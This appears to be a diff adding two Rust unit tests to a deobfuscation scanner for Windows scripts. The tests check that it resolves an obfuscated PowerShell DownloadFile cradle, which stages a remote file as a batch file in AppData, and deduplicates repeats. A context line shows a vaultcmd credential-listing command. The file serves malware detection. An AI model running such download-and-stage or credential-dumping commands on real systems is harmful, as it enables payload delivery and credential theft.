@@ -28139,6 +28139,60 @@ vaultcmd /listcreds:"Windows Credentials"
     }
 
     #[test]
+    fn deob_text_var_substring_downloadfile_body_promotes_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("scheme", "https");
+        env.set("host", "github.com");
+        env.set("path", "owner/repo/raw/main/up.png");
+        crate::deob_scan::scan_deob_text(
+            r#"(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', '%APPDATA%\stage\up.bat')"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && dst.as_deref() == Some("C:\\Users\\puncher\\AppData\\Roaming\\stage\\up.bat")
+                )
+            }),
+            "assembled DownloadFile body not promoted to structured Download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn deob_text_var_substring_duplicate_downloadfile_body_is_deduped() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.set("scheme", "https");
+        env.set("host", "github.com");
+        env.set("path", "owner/repo/raw/main/up.png");
+        crate::deob_scan::scan_deob_text(
+            r#"(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', '%APPDATA%\stage\up.bat')
+(New-Object Net.WebClient).DownloadFile('%scheme:~0,5%://%host:~0,10%/%path:~0,26%', '%APPDATA%\stage\up.bat')"#,
+            &mut env,
+        );
+        let downloads = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://github.com/owner/repo/raw/main/up.png"
+                            && dst.as_deref() == Some("C:\\Users\\puncher\\AppData\\Roaming\\stage\\up.bat")
+                )
+            })
+            .count();
+        assert_eq!(
+            downloads, 1,
+            "duplicate assembled DownloadFile body emitted duplicate structured Downloads: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn deob_text_var_substring_assembled_url_uses_local_set_bindings() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
